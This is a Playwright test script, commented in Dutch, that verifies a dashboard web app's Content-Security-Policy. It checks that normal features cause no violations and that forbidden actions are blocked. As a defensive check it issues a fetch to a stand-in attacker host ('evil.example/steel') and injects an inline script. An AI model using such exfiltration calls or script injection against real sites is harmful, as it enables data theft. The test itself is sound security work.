// CSP: alles wat het dashboard doet moet binnen de beveiligingsregel vallen, en al het andere wordt geblokkeerd.
import { chromium } from 'playwright';
import fs from 'node:fs';
import { INDEX_URL, FIX } from './helpers.mjs';

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
const json = { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' };
await ctx.route('https://api.open-meteo.com/**', r => r.fulfill({ headers: json, body: fs.readFileSync(FIX + '/weather.json', 'utf8') }));
await ctx.route('https://geocoding-api.open-meteo.com/**', r => r.fulfill({ headers: json, body: fs.readFileSync(FIX + '/geo.json', 'utf8') }));
await ctx.route('https://dash.test.workers.dev/**', r => {
  const url = r.request().url();
  if (url.includes('/ping')) return r.fulfill({ headers: json, body: '{"ok":true,"version":"test"}' });
  return r.fulfill({ headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/xml' }, body: fs.readFileSync(FIX + '/nos.xml', 'utf8') });
});
await ctx.route('https://icons.duckduckgo.com/**', r => r.fulfill({ headers: { 'Content-Type': 'image/png' }, body: fs.readFileSync(FIX + '/logo.png') }));
await ctx.route(/^https:\/\/(?!api\.open-meteo|geocoding-api|dash\.test|icons\.duckduckgo)/, r => r.fulfill({ status: 404, body: '' }));

const p = await ctx.newPage();
const errors = [];
p.on('pageerror', e => errors.push(e.message));
await p.addInitScript(() => {
  window.__violations = [];
  document.addEventListener('securitypolicyviolation', e => window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
});
let fails = 0;
const check = (n, ok, x = '') => { if (!ok) fails++; console.log((ok ? 'OK  ' : 'FOUT') + ' ' + n + (x ? '  → ' + x : '')); };

await p.goto(INDEX_URL);
await p.evaluate(() => localStorage.clear()); await p.reload(); await p.waitForTimeout(300);
check('CSP-meta aanwezig', await p.evaluate(() => !!document.querySelector('meta[http-equiv="Content-Security-Policy"]')));

// Alles gebruiken: weer, plaats zoeken, Worker-test, RSS, favicons, logo-upload, achtergrond, sessiebestand
await p.evaluate(() => {
  const d = normalizeConfig(DEFAULT_CONFIG);
  d.services = { workerUrl: 'https://dash.test.workers.dev', workerKey: 'k' };
  applyConfig(normalizeConfig(d));
});
await p.waitForTimeout(500);
await p.click('#settingsBtn');
await p.click('[data-section="weather"]');
await p.fill('#placeSearch', 'Utrecht'); await p.waitForTimeout(600);
await p.click('[data-section="services"]');
await p.click('[data-action="test-worker"]'); await p.waitForTimeout(300);
check('Verbinding testen werkt binnen de CSP', (await p.textContent('#workerStatus')).includes('Verbinding gelukt'));
await p.click('[data-section="general"]');
await p.selectOption('[data-path="general.logo.source"]', 'upload');
await p.setInputFiles('[data-image="logo"]', FIX + '/logo.png'); await p.waitForTimeout(300);
await p.click('[data-section="appearance"]');
await p.selectOption('[data-path="appearance.background.type"]', 'image');
await p.setInputFiles('[data-image="background"]', FIX + '/logo.png'); await p.waitForTimeout(300);
await p.click('[data-action="save-settings"]'); await p.waitForTimeout(300);
check('weer, feed, logo en favicons zichtbaar', await p.evaluate(() =>
  !document.querySelector('#weatherWidget').hidden &&
  document.querySelectorAll('.feed-item').length > 0 &&
  !document.querySelector('#logo').hidden &&
  [...document.querySelectorAll('img.favicon')].some(i => i.complete && i.naturalWidth > 0)));
check('geen CSP-overtredingen bij normaal gebruik', (await p.evaluate(() => window.__violations)).length === 0, (await p.evaluate(() => window.__violations)).join(', '));

// Wat niet mag, wordt geblokkeerd
const blocked = await p.evaluate(async () => {
  window.__violations = [];
  const fetchBlocked = await fetch('https://evil.example/steel').then(() => false, () => true);
  const s = document.createElement('script');
  s.textContent = 'window.__injected = true';
  document.head.append(s);
  await new Promise(r => setTimeout(r, 100));
  return { fetchBlocked, injected: window.__injected === true, violations: window.__violations };
});
check('verbinding met een onbekende server geblokkeerd', blocked.fetchBlocked && blocked.violations.some(v => v.startsWith('connect-src')));
check('ingevoegd script wordt niet uitgevoerd', !blocked.injected && blocked.violations.some(v => v.startsWith('script-src')), blocked.violations.join(', '));

// Een Worker buiten workers.dev wordt bij het opslaan geweigerd, met uitleg
await p.click('#settingsBtn'); await p.click('[data-section="services"]');
await p.fill('[data-path="services.workerUrl"]', 'https://proxy.mijndomein.nl');
await p.click('[data-action="save-settings"]'); await p.waitForTimeout(150);
check('Worker buiten workers.dev geweigerd met uitleg', (await p.textContent('#toast')).includes('workers.dev'));

console.log('paginafouten:', errors.length ? errors : 'geen');
console.log(fails ? fails + ' FOUT(EN)' : 'ALLES OK');
await browser.close();
